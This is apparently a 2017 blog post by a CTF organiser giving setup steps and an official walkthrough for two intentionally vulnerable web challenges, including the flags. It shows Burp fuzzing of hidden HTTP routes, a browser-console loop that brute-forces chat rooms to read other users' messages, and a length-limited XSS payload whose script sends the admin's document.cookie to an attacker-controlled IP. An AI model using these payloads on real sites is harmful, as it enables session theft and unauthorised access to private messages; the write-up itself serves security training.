---
layout: post
title: "CactusCon and AppSec USA CTF Challenges and Walkthrough"
date: 2017-10-03 14:33:02
description: Walkthrough for ChittyChat and Business Casual
tags: CTF CactusCon AppSecUSA
categories: CTF CactusCon
twitter_text:
---


This year my colleagues and I hosted a CTF at AppSec USA in Orlando, Florida and CactusCon in Phoenix, Arizona. I developed two of the challenges for the CTF. In this post, I will give you the source code and how to set up the challenge locally. I am also providing an official walkthrough describing how I expected people to go through the challenges.

# Set-up

Set up for both challenges is fairly similar.

## Prerequisites

_Note: I did all my development on a Mac, I see no reason why this wouldn't work on a Linux machine, and in theory this should work for Windows as well._

Vagrant - [https://www.vagrantup.com/](https://www.vagrantup.com/)

Virtualbox - [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)

## Chitty Chat

```bash
git clone https://github.com/dejanzelic/chittychat.git
cd chittychat
vagrant up 
```

Visit the page at: [http://127.0.0.1:1234/](http://127.0.0.1:1234/)

## Business Casual

```bash
git clone https://github.com/dejanzelic/business-casual.git 
cd business-casual/
vagrant up 
sudo echo '127.0.0.1 business-casual.mysterious-hashes.net' >> /etc/hosts
```

Visit the page at: [http://business-casual.mysterious-hashes.net:8081/](http://business-casual.mysterious-hashes.net:8080/)

_Note: the domain on this challenge is important and necessary!_

# Walkthrough

The section below contains spoilers for Chitty Chat and Business Casual. Do not continue reading if you would like to attempt the challenges yourself.

## Chitty Chat

Chitty Chat is an application that allows users to chat between themselves by simply sharing a URL. It has 3 challenges: hidden path, reading other people's messages, and secret admin functions.

### Hidden Path

This was, in my opinion, the easiest flag. If you did this challenge at CactusCon, I even did a talk that morning about this: [https://dejandayoff.com/http-route-busting/](https://dejandayoff.com/http-route-busting/)

Using tools like dirb and dirbuster are great for finding hidden files within a web application. However, the down side is that they will only ever send a GET request to the application. To complete this challenge, the participant had to send a PUT to the /category path.

To solve the challenge, one option is to use Burp's intruder where the marker is placed on the HTTP Method and the path (as discussed in my talk). For the methods I just used "GET, POST, PUT, DELETE" and for the path I used dirb's common.txt wordlist.

 ![Burp Markers](/assets/img/ccandbc/1burp.png)

Here is that hidden path:

 ![Burp Results](/assets/img/ccandbc/2burp.png)

flag{ILikeToPlayHideAndSeek}

### Reading Other Peoples Messages

The next challenges is more difficult. My hope was that people would use the ChittyChat application as intended and find the hidden function that would allow you to read other people's messages if the messages are still open.  For example, I created a chat between 2 people with some simple messages:

 ![sample chat](/assets/img/ccandbc/3cc.png)

If a third person tried to join by visiting the URL, they will get a message mentioning that the chat is full and the application will display the archived messages:

 ![Too Many in Room](/assets/img/ccandbc/4cc.png)

Initially, this challenge seems simple, just enumerate all the possible chat rooms (1-10000) and try to find any that contain content. If you did that, you would not find the flag; what gives?

If a participant used the application and reviewed how the applications works, they should notice a couple things:

1. The challenge is using WebSockets for the communication. (which executes with javascript; hence, why brute forcing all possible chats with something like Burp wouldn't work)
2. Chat.js is the Holy Grail for debugging this application.

Within chat.js there is a function that is executed on initial connect:

```javascript
socket.emit('load', id);
```

The code above will load the data for the chat with the specified ID. To brute force all chats, the participant needed to write a short script that will iterate through all the existing chat rooms:

```javascript
var socket = io();
for (i = 0; i < 10000; i++) { socket.emit('load', i);}
```

This code will need to be executed in chrome or firefox's devtools within the chat app. The script will go through and load all the conversations in all rooms:

 ![All chats](/assets/img/ccandbc/5cc.png)

flag{KatyPerryCanBeAPoopyHead}

### Secret Admin Function

The final flag for Chitty Chat can also be found in the chat.js javascript file. By reviewing the file, the participant was expected to find the showAdmin function:

```javascript
function showAdmin(){
	$.ajax({url: "/cz5Fc6sz7rppPf8B",
		headers: {
        'X-admin-token':'9PZxgVeZiMShe1KV',
    	},
		success: function(result){
        	$('#admin_bar').html(result);
    }});

	$.getScript( "/js/cz5Fc6sz7rppPf8B.js", function( data) {
	});
}
```

The showAdmin function will make a call out to the server using ajax and load the admin function. This page can be viewed manually (make sure the admin token is also set) or the participant could have ran the function in the developer console within the application.

 ![Hidden Admin Code](/assets/img/ccandbc/6cc.png)

Once exscuted, the browser will then load the "admin" toolbar:

 ![Hidden Admin bar](/assets/img/ccandbc/7cc.png)

And the flag can be found within the statistics tab:

 ![Stats page](/assets/img/ccandbc/8cc.png)

flag{ThisAdminDoesntKnowWhatTheyAreDoing}

## Business Casual

I envisioned Business Casual as a realistic XSS challenge. There were 2 challenges but the first flag was very easy (hidden page), where the second flag was more difficult (Limited XSS). To get the second flag, the user needed to steal the admin's cookie.

### Hidden Page

I'm not going to go into too much detail for this one since flag is easy to find. Dirbuster or dirb would have found it with just about any wordlist.

 ![Contact Page](/assets/img/ccandbc/9bc.png)

This page is necessary to the next challenge which is why there was a flag.

### Limited XSS

The home page of the application contains a comment in the source that points to an admin panel:

```html
<!--To Do!-->
<!--<div class="collapse navbar-collapse" id="navbarResponsive">
  <ul class="navbar-nav ml-auto">
    <li class="nav-item">
      <a class="nav-link" href="/?page=admin">Admin</a>
    </li>
  </ul>
</div>-->
```

The user should get the hint that this page does not exist (hence the "to do" note) However, when visiting the page, a new javascript library is attempted to be loaded:

```html
<script src="/javascripts/admin.js" ></script>
```

The "admin" part of this script is loaded from the page parameter. For example, if we visit /?page=xss-test, the page will load:

```html
<script src="/javascripts/xss-test.js" ></script>
```

Now we just need to escape out of the html and point to a javascript file we control:

http://business-casual.mysterious-hashes.net:8080/?page **="></script><script src="http://192.168.1.100/script**

If we visit this page, this is the js that is attempted to be loaded:

```html
<script src="/javascripts/ **"></script><script src="http://192.168.1**.js" ></script>
```

That is not the full script we put in and it won't work. The application limits the amount of characters that can be submitted. Instead we need to use the shorthand for protocol and call the file without a name:

http://business-casual.mysterious-hashes.net:8080/?page **="></script><script src="//192.168.1.100/**

Let's break this down:

1. The first quote is to end the src html attribute
2. The greater than is to end the first script tag
3. The next </script> is to make the html valid and end the unused script tag
4. Next we create a new script tag at <script…
5. And finally the source is the ip but without the protocol. Instead "//" instructs the browser to use whatever protocol loaded the page initially

Let's set up a server and see if we can get a request to come through (I am using python's SimpleHTTPServer on port 80 for this). In the logs, we can see that the application is looking to load the file .js:

 ![SimpleHTTPServer set up](/assets/img/ccandbc/10bc.png)

Now that we can confirm the page is attempting to load a file, we need to create a javascript file. We could set up a beef hook, but that is overkill to get a simple cookie. Instead a redirect with the cookie in the URL will be good. That means the code that will go into the file named ".js" in the root of our webserver will look something like this:

```javascript
window.location = "http://192.168.1.100/?fake=" + document.cookie;
```

Once we load the page with the XSS vulnerability, we can see that a redirect immediately occurs and appends the "?fake=" to the URL.

 ![With Redirect](/assets/img/ccandbc/11bc.png)

Our browser will not have anything in document.cookie because we never visited a page that set a cookie. But if we did, the parameter would contain a cookie.

This is where the first flag comes in. the /contact page contains a page to send an email to the admin with any issues you might be experiencing. We will send them the link with the XSS that we generated above:

 ![Contact Submit](/assets/img/ccandbc/12bc.png)

And if we watch our server logs, we will see a request that contains the flag:

 ![Hidden flag](/assets/img/ccandbc/13bc.png)

flag{ILoveLinks!ClickClickClick!}

